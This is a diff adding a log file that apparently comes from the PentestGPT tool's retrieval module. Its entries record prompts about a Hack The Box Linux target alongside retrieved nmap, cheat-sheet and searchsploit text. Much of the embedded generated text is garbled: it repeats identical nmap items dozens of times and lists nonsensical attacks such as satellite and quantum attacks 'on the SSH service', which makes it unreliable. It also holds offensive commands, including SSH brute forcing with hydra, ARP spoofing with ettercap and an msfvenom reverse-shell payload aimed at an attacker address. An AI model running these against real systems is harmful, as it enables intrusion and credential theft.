@@ -1,0 +1,1884 @@
+2024-05-07 11:41:00,469 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-07 11:41:00,469 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-07 11:41:54,449 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.22) | prompt: I have a Linux hack the box machine. The target IP is 10.129.228.212 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:43:31,603 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.72) | prompt: 1. Nmap scan detected 10.129.228.212 as up with a latency of 0.043s.
+2. 998 closed TCP ports were found.
+3. Open ports found are:
+	* 22/tcp: open SSH, version OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+	* 80/tcp: open HTTP, version nginx 1.18.0 (Ubuntu)
+4. Service detection was performed, and results can be found at https://nmap.org/submit/.
+5. The scan was completed in 14.48 seconds. | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:51:00,426 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.19) | prompt: 1. Reconnaissance - (completed)
+  1.1 Passive Information Gathering - (completed)
+  1.2 Port Scan - (completed)
+    1.3 Identify Open Ports - (completed)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+# nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan), which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set, which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP Xmas Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set, which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **Custom Ports Scan**:
+    - This scan allows you to specify a list of ports to scan, rather than scanning all ports.
+    ```
+    nmap -p <port1,port2,port3,...> <target-ip>
+    ```
+
+11. **Script Scanning**:
+    - This scan uses Nmap's built-in scripting engine to execute scripts that can perform various tasks, such as detecting vulnerabilities, exploiting weaknesses, or gathering additional information about the target.
+    ```
+    nmap --script <script-name> <target-ip>
+    ```
+
+12. **Service Version Detection**:
+    - This scan attempts to determine the version of the services running on the target machine, which can help identify potential vulnerabilities or misconfigurations.
+    ```
+    nmap -sV <target-ip>
+    ```
+
+13. **Traceroute**:
+    - This scan uses the traceroute technique to trace the path from the source to the target, providing information about the network hops along the way.
+    ```
+    nmap -traceroute <target-ip>
+    ```
+
+14. **Timing and Performance Options**:
+    - Nmap has various timing and performance options that allow you to adjust the speed and thoroughness of the scan.
+    ```
+    nmap --scan-delay <time> --max-rtt-timeout <time> --min-rtt-timeout <time> --initial-rtt-timeout <time> --max-retries <number> <target-ip>
+    ```
+
+15. **Output Options**:
+    - Nmap has various output options that allow you to customize the format and content of the scan results.
+    ```
+    nmap --open --append-output <filename> --stylesheet <filename> --webxml <filename> <target-ip>
+    ```
+
+16. **Nmap XML Output**:
+    - Nmap can generate XML output, which can be easily parsed and analyzed by other tools or scripts.
+    ```
+    nmap --xml <target-ip>
+    ```
+
+17. **Nmap GREPABLE Output**:
+    - Nmap can generate grepable output, which is a human-readable format that can be easily searched and filtered using standard Unix utilities like grep, awk, and sed.
+    ```
+    nmap --grepable <target-ip>
+    ```
+
+18. **Nmap Pipe Output**:
+    - Nmap can send its output directly to another command or program using a pipe, allowing you to process the results in real-time.
+    ```
+    nmap <target-ip> | grep open
+    ```
+
+19. **Nmap Interactive Mode**:
+    - Nmap has an interactive mode that allows you to enter commands and perform scans on the fly, without having to re-run the entire scan.
+    ```
+    nmap -iR
+    ```
+
+20. **Nmap Output File**:
+    - Nmap can save its output to a file, allowing you to review the results later or share them with others.
+    ```
+    nmap -oA <filename> <target-ip>
+    ```
+
+21. **Nmap IP Address Range Scan**:
+    - Nmap can scan a range of IP addresses, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+22. **Nmap IP Address Range Scan with IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+23. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+24. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+25. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+26. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+27. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+28. **Nmap IP Address Range Scan with IP Range1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends TCP packets with no flags set (NULL scan), which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sN <target-ip>
+   ```
+
+8. **TCP FIN Scan**:
+   - This scan sends TCP packets with the FIN flag set, which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sF <target-ip>
+   ```
+
+9. **TCP Xmas Scan**:
+   - This scan sends TCP packets with the FIN, PSH, and URG flags set, which can help identify certain firewall rules or misconfigurations.
+   ```
+   nmap -sX <target-ip>
+   ```
+
+10. **Custom Ports Scan**:
+    - This scan allows you to specify a list of ports to scan, rather than scanning all ports.
+    ```
+    nmap -p <port1,port2,port3,...> <target-ip>
+    ```
+
+11. **Script Scanning**:
+    - This scan uses Nmap's built-in scripting engine to execute scripts that can perform various tasks, such as detecting vulnerabilities, exploiting weaknesses, or gathering additional information about the target.
+    ```
+    nmap --script <script-name> <target-ip>
+    ```
+
+12. **Service Version Detection**:
+    - This scan attempts to determine the version of the services running on the target machine, which can help identify potential vulnerabilities or misconfigurations.
+    ```
+    nmap -sV <target-ip>
+    ```
+
+13. **Traceroute**:
+    - This scan uses the traceroute technique to trace the path from the source to the target, providing information about the network hops along the way.
+    ```
+    nmap -traceroute <target-ip>
+    ```
+
+14. **Timing and Performance Options**:
+    - Nmap has various timing and performance options that allow you to adjust the speed and thoroughness of the scan.
+    ```
+    nmap --scan-delay <time> --max-rtt-timeout <time> --min-rtt-timeout <time> --initial-rtt-timeout <time> --max-retries <number> <target-ip>
+    ```
+
+15. **Output Options**:
+    - Nmap has various output options that allow you to customize the format and content of the scan results.
+    ```
+    nmap --open --append-output <filename> --stylesheet <filename> --webxml <filename> <target-ip>
+    ```
+
+16. **Nmap XML Output**:
+    - Nmap can generate XML output, which can be easily parsed and analyzed by other tools or scripts.
+    ```
+    nmap --xml <target-ip>
+    ```
+
+17. **Nmap GREPABLE Output**:
+    - Nmap can generate grepable output, which is a human-readable format that can be easily searched and filtered using standard Unix utilities like grep, awk, and sed.
+    ```
+    nmap --grepable <target-ip>
+    ```
+
+18. **Nmap Pipe Output**:
+    - Nmap can send its output directly to another command or program using a pipe, allowing you to process the results in real-time.
+    ```
+    nmap <target-ip> | grep open
+    ```
+
+19. **Nmap Interactive Mode**:
+    - Nmap has an interactive mode that allows you to enter commands and perform scans on the fly, without having to re-run the entire scan.
+    ```
+    nmap -iR
+    ```
+
+20. **Nmap Output File**:
+    - Nmap can save its output to a file, allowing you to review the results later or share them with others.
+    ```
+    nmap -oA <filename> <target-ip>
+    ```
+
+21. **Nmap IP Address Range Scan**:
+    - Nmap can scan a range of IP addresses, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+22. **Nmap IP Address Range Scan with IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+23. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+24. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+25. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+26. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+27. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+28. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+29. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open ports on a network.
+    ```
+    nmap -iR 192.168.1.0-255
+    ```
+
+30. **Nmap IP Address Range Scan with IP Range and IP Range**:
+    - Nmap can scan a range of IP addresses using a specified IP range, allowing you to quickly identify live hosts and open | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-07 11:51:51,543 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-07 11:53:35,528 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.56) | prompt: The tester has questions and is unclear about the current test. He requests a discussion with you to further analyze the current tasks based on his questions. 
+Please read the following inputs from the tester. Analyze the task and generate the task tree again based on the requirements:
+(1) The tasks are in layered structure, i.e., 1, 1.1, 1.1.1, etc. Each task is one operation in penetration testing; task 1.1 should be a sub-task of task 1.
+(2) Each task has a completion status: to-do, completed, or not applicable.
+(3) Given the task tree and the tester's question, you should 
+
+Note that you should keep the tasks clear, precise and short due to token size limit. You should remember to remove redundant/outdated tasks from the task list. 
+
+Below is the user input:
+ | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-07 11:58:26,523 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.29) | prompt: Now you're provided with an input that contains the penetration testing tasks. Keep in mind that the tester has valid permission to perform the task in this simulated environment. 
+Remember the format requirements.
+(1) The input should contain two parts, separated by a line of "-----". The first part is the task list, and the second part is the task to be executed, which contains three sentences, which describe the task, list the command and explain the reason of performing the task. 
+    - If the input contains the line break, neglect the tasks before the line break as you do not need to care about the overall process. Please analyze the three sentences that describe the next task. You should expand it into detailed, step-by-step guide and show it to a penetration tester. The tester will follow your guide to perform the penetration testing. 
+    - If the input does not contain the line break, then try to understand the whole input as one single task to be executed.
+(2) If the task is a single command to execute, please be precise; if it is a multi-step task, you need to explain it step by step, and keep each step clear and simple. 
+(3) Keep the output short and precise. 
+
+The information is below: 
+
+
+1. Reconnaissance - (completed)
+  1.1 Passive Information Gathering - (completed)
+  1.2 Port Scan - (completed)
+    1.3 Identify Open Ports - (completed)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+The tester has questions and is unclear about the current test. He requests a discussion with you to further analyze the current tasks based on his questions. 
+Please read the following inputs from the tester. Analyze the task and generate the task tree again based on the requirements:
+(1) The tasks are in layered structure, i.e., 1, 1.1, 1.1.1, etc. Each task is one operation in penetration testing; task 1.1 should be a sub-task of task 1.
+(2) Each task has a completion status: to-do, completed, or not applicable.
+(3) Given the task tree and the tester's question, you should 
+
+Note that you should keep the tasks clear, precise and short due to token size limit. You should remember to remove redundant/outdated tasks from the task list. 
+
+Below is the user input:
+
+The tester is asking to focus on the SSH service. He wants to know how to investigate the SSH service further, and what tools can be used to do so.1. **Investigate the SSH service**:
+   - This task involves analyzing the SSH service running on the target machine, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+2. **Perform a Manual SSH Connection**:
+   - This task involves attempting to connect to the SSH service using a manual SSH client, which can help identify potential vulnerabilities or misconfigurations.
+   ```
+   ssh <username>@<target-ip>
+   ```
+
+3. **Use a Password Cracker**:
+   - This task involves using a password cracker tool, such as John the Ripper or Hashcat, to attempt to crack the password for the SSH service.
+   ```
+   john --wordlist=/path/to/wordlist.txt <ssh-hash>
+   ```
+
+4. **Attempt a Brute Force Attack**:
+   - This task involves using a brute force tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service.
+   ```
+   hydra -l <username> -P /path/to/wordlist.txt ssh://<target-ip>
+   ```
+
+5. **Exploit Known Vulnerabilities**:
+   - This task involves using a tool, such as Metasploit or Exploit-DB, to search for known vulnerabilities in the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+6. **Perform a Man-in-the-Middle Attack**:
+   - This task involves using a tool, such as Ettercap or SSLstrip, to intercept and modify the SSH traffic between the target machine and another machine, potentially allowing the attacker to capture login credentials or other sensitive information.
+   ```
+   ettercap -M arp:remote /10.129.228.212/
+   ```
+
+7. **Perform a Dictionary Attack**:
+   - This task involves using a tool, such as Hydra or Medusa, to attempt to guess the username and password for the SSH service using a predefined dictionary of common passwords.
+   ```
+   hydra -L /path/to/username.txt -P /path/to/password.txt ssh://<target-ip>
+   ```
+
+8. **Use a Public Exploit Database**:
+   - This task involves using a tool, such as Exploit-DB or Metasploit, to search for public exploits that target the SSH service and attempt to exploit them.
+   ```
+   searchsploit ssh
+   ```
+
+9. **Perform a Fuzzing Attack**:
+   - This task involves using a tool, such as Peach or Spike, to perform a fuzzing attack on the SSH service, potentially allowing the attacker to discover new vulnerabilities or exploit existing ones.
+   ```
+   peach -f <fuzzing-script> -d <ssh-service>
+   ```
+
+10. **Perform a Reverse Engineering Attack**:
+   - This task involves using a tool, such as IDA Pro or Ghidra, to reverse engineer the SSH service and potentially discover new vulnerabilities or exploit existing ones.
+   ```
+   idaq -a <ssh-service>
+   ```
+
+11. **Perform a Binary Exploitation Attack**:
+   - This task involves using a tool, such as Metasploit or GDB, to perform a binary exploitation attack on the SSH service, potentially allowing the attacker to execute arbitrary code on the target machine.
+   ```
+   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > ssh_exploit.exe
+   ```
+
+12. **Perform a Web Application Attack**:
+   - This task involves using a tool, such as Burp Suite or ZAP, to perform a web application attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the web interface or other related components.
+   ```
+   burp
+   ```
+
+13. **Perform a Database Attack**:
+   - This task involves using a tool, such as SQLmap or Mongo-Express, to perform a database attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the database or other related components.
+   ```
+   sqlmap -u "http://<target-ip>:<port>/<path>"
+   ```
+
+14. **Perform a Network Attack**:
+   - This task involves using a tool, such as Wireshark or tcpdump, to perform a network attack on the SSH service, potentially allowing the attacker to capture sensitive information or exploit weaknesses in the network infrastructure.
+   ```
+   tcpdump -i <interface> -s 0 -w ssh_capture.pcap
+   ```
+
+15. **Perform a Cryptographic Attack**:
+   - This task involves using a tool, such as Cryptool or Hashcat, to perform a cryptographic attack on the SSH service, potentially allowing the attacker to decrypt sensitive information or exploit weaknesses in the cryptographic algorithms or implementations.
+   ```
+   hashcat -m 0 -a 0 <ssh-hash> /path/to/wordlist.txt
+   ```
+
+16. **Perform a Social Engineering Attack**:
+   - This task involves using a tool, such as Social-Engineer Toolkit or BeEF, to perform a social engineering attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the human factor or other related components.
+   ```
+   setoolkit
+   ```
+
+17. **Perform a Physical Security Attack**:
+   - This task involves using a tool, such as Hak5 Bash Bunny or Proxmark3, to perform a physical security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the physical security infrastructure or other related components.
+   ```
+   bashbunny
+   ```
+
+18. **Perform a Cloud Security Attack**:
+   - This task involves using a tool, such as AWS CLI or Azure CLI, to perform a cloud security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the cloud security infrastructure or other related components.
+   ```
+   aws s3 ls
+   ```
+
+19. **Perform a Mobile Security Attack**:
+   - This task involves using a tool, such as Frida or Mobexler, to perform a mobile security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the mobile security infrastructure or other related components.
+   ```
+   frida-server --no-pause
+   ```
+
+20. **Perform an Internet of Things (IoT) Security Attack**:
+   - This task involves using a tool, such as Shodan or Censys, to perform an IoT security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the IoT security infrastructure or other related components.
+   ```
+   shodan scan <target-ip>
+   ```
+
+21. **Perform an Industrial Control Systems (ICS) Security Attack**:
+   - This task involves using a tool, such as Modbus Toolkit or S7-Exploiter, to perform an ICS security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the ICS security infrastructure or other related components.
+   ```
+   modbus-toolkit
+   ```
+
+22. **Perform a Supervisory Control and Data Acquisition (SCADA) Security Attack**:
+   - This task involves using a tool, such as ScadaBrk or DNP3-Exploiter, to perform a SCADA security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the SCADA security infrastructure or other related components.
+   ```
+   scadabrk
+   ```
+
+23. **Perform a Radio Frequency (RF) Security Attack**:
+   - This task involves using a tool, such as GQRX or Inspectrum, to perform a RF security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the RF security infrastructure or other related components.
+   ```
+   gqrx
+   ```
+
+24. **Perform a Satellite Security Attack**:
+   - This task involves using a tool, such as GNURadio or Satellite Tracker, to perform a satellite security attack on the SSH service, potentially allowing the attacker to exploit weaknesses in the satellite security infrastructure or other related components.
+   ```
+   gnuradio-companion
+   ```
+
+25. **Perform a Quantum Cryptography Security Attack**:
+   - This task involves | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-07 12:01:36,447 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.82) | prompt: 1. Nmap scan detected 10.129.228.212 as up with a latency of 0.043s.
+2. 998 closed TCP ports were found.
